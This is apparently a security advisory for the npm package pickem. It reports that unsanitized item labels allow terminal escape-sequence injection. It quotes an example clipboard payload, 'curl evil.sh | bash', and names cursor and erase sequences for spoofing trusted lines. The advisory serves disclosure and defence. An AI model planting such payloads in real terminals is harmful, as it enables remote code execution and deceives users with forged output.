package_slug: "npm/pickem"
title: "pickem vulnerable to terminal escape-sequence injection via unsanitized item
  text"
description: "pickem rendered item text (label, description, group, meta, name) to
  the terminal with no control-character sanitization. `chrome.row` only stripped
  ANSI from the **active** row; inactive rows, the public `createFormatter`, and selection-summary
  lines printed labels **raw**, and the ANSI strip missed bare C0 controls anyway.\n\nBecause
  item text is frequently attacker-controllable (git branch names, PR/issue titles,
  filenames, npm/API results), a malicious label was a terminal write primitive:\n\n-
  **OSC 52 clipboard write** — silently load e.g. `curl evil.sh | bash` into the user's
  clipboard; their next paste-into-shell is RCE.\n- **Cursor-movement + erase** (`ESC[1A`,
  `ESC[2K`) — overwrite already-printed trusted lines to spoof UI (forge a \"✓ Verified
  publisher\", fake prompt, or hide a malicious entry).\n- **BEL / C0 control flooding.**\n\nAny
  CLI that passes untrusted strings into pickem choices is affected."
